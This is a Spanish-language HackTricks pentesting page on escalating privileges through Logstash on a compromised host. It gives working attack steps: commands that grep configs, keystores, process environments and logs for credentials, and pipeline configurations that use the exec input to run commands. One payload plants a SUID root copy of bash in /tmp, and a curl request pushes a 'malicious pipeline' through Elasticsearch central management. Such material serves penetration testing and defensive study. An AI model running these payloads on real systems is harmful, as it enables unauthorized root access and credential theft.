# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se utiliza para **recopilar, transformar y despachar logs** mediante un sistema conocido como **pipelines**. Estos pipelines están compuestos por etapas de **input**, **filter** y **output**. Un aspecto interesante surge cuando Logstash opera en una máquina comprometida.

### Configuración del Pipeline

Los pipelines se configuran en el archivo **/etc/logstash/pipelines.yml**, que enumera las ubicaciones de las configuraciones de los pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este archivo revela dónde se encuentran los archivos **.conf**, que contienen las configuraciones de los pipelines. Al utilizar un **Elasticsearch output module**, es común que los **pipelines** incluyan **credenciales de Elasticsearch**, que a menudo tienen privilegios amplios debido a la necesidad de Logstash de escribir datos en Elasticsearch. Los comodines en las rutas de configuración permiten que Logstash ejecute todos los pipelines que coincidan en el directorio designado.

Si Logstash se inicia con `-f <directory>` en lugar de `pipelines.yml`, **todos los archivos dentro de ese directorio se concatenan en orden lexicográfico y se analizan como una única configuración**. Esto crea 2 implicaciones ofensivas:

- Un archivo colocado como `000-input.conf` o `zzz-output.conf` puede cambiar cómo se ensambla el pipeline final
- Un archivo mal formado puede impedir que se cargue todo el pipeline, por lo que debes validar cuidadosamente los payloads antes de depender de la recarga automática

### Enumeración rápida en un host comprometido

En un equipo donde Logstash está instalado, inspecciona rápidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Comprueba también si la API de monitorización local es accesible. De forma predeterminada, se enlaza en **127.0.0.1:9600**, lo que normalmente es suficiente tras obtener acceso al host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Esto normalmente te proporciona los IDs de los pipelines, detalles del runtime y confirmación de que tu pipeline modificado se ha cargado.

Las credenciales recuperadas de Logstash suelen permitir acceder a **Elasticsearch**, así que consulta [esta otra página sobre Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Escalada de privilegios mediante Pipelines escribibles

Para intentar una escalada de privilegios, identifica primero el usuario bajo el que se ejecuta el servicio de Logstash, normalmente el usuario **logstash**. Asegúrate de cumplir **uno** de estos criterios:

- Tener **permisos de escritura** en un archivo **.conf** de un pipeline **o**
- Que el archivo **/etc/logstash/pipelines.yml** utilice un comodín y puedas escribir en la carpeta de destino

Además, debe cumplirse **una** de estas condiciones:

- Poder reiniciar el servicio de Logstash **o**
- Que el archivo **/etc/logstash/logstash.yml** tenga configurado **config.reload.automatic: true**

Dado que hay un comodín en la configuración, crear un archivo que coincida con este comodín permite ejecutar comandos. Por ejemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aquí, **interval** determina la frecuencia de ejecución en segundos. En el ejemplo proporcionado, el comando **whoami** se ejecuta cada 120 segundos y su salida se dirige a **/tmp/output.log**.

Con **config.reload.automatic: true** en **/etc/logstash/logstash.yml**, Logstash detectará y aplicará automáticamente las configuraciones de pipeline nuevas o modificadas sin necesidad de reiniciarse. Si no hay ningún comodín, aún se pueden realizar modificaciones en las configuraciones existentes, pero se recomienda tener precaución para evitar interrupciones.

### Payloads de Pipeline más fiables

El plugin de entrada `exec` sigue funcionando en las versiones actuales y requiere un `interval` o un `schedule`. Se ejecuta haciendo **fork** de la JVM de Logstash, por lo que, si la memoria es limitada, tu payload puede fallar con `ENOMEM` en lugar de ejecutarse silenciosamente.

Un payload de escalada de privilegios más práctico suele ser uno que deje un artefacto persistente:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si no tienes permisos para reiniciar, pero puedes enviar señales al proceso, Logstash también admite una recarga activada por **SIGHUP** en sistemas similares a Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Ten en cuenta que no todos los plugins permiten la recarga. Por ejemplo, la entrada **stdin** impide la recarga automática, así que no asumas que `config.reload.automatic` siempre detectará tus cambios.

### Extracción de secretos de Logstash

Antes de centrarte únicamente en la ejecución de código, recopila los datos a los que Logstash ya tiene acceso:

- Las credenciales en texto plano suelen estar incrustadas en las salidas `elasticsearch {}`, en `http_poller`, en las entradas JDBC o en la configuración relacionada con cloud
- La configuración segura puede encontrarse en **`/etc/logstash/logstash.keystore`** u otro directorio `path.settings`
- La contraseña del keystore suele proporcionarse mediante **`LOGSTASH_KEYSTORE_PASS`**, y las instalaciones basadas en paquetes normalmente la obtienen de **`/etc/sysconfig/logstash`**
- La expansión de variables de entorno mediante `${VAR}` se resuelve cuando Logstash se inicia, por lo que conviene inspeccionar el entorno del servicio

Comprobaciones útiles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
También vale la pena comprobar esto porque **CVE-2023-46672** demostró que Logstash podía registrar información sensible en los logs bajo circunstancias específicas. Por lo tanto, en un host con post-exploitation, los logs antiguos de Logstash y las entradas de `journald` podrían revelar credenciales incluso si la configuración actual hace referencia al keystore en lugar de almacenar los secretos inline.

### Abuso de la gestión centralizada de pipelines

En algunos entornos, el host **no** depende en absoluto de archivos `.conf` locales. Si se configura **`xpack.management.enabled: true`**, Logstash puede obtener pipelines gestionados de forma centralizada desde Elasticsearch/Kibana y, después de habilitar este modo, las configuraciones de pipelines locales dejan de ser la fuente de verdad.

Esto implica una ruta de ataque diferente:

1. Recuperar las credenciales de Elastic desde la configuración local de Logstash, el keystore o los logs
2. Verificar si la cuenta tiene el privilegio de clúster **`manage_logstash_pipelines`**
3. Crear o reemplazar un pipeline gestionado de forma centralizada para que el host de Logstash ejecute tu payload en su siguiente intervalo de consulta

La API de Elasticsearch utilizada para esta funcionalidad es:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Esto es especialmente útil cuando los archivos locales son de solo lectura, pero Logstash ya está registrado para obtener pipelines de forma remota.

## Referencias

- [Documentación de Elastic: Recarga del archivo de configuración](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Documentación de Elastic: Configuración de la gestión centralizada de pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
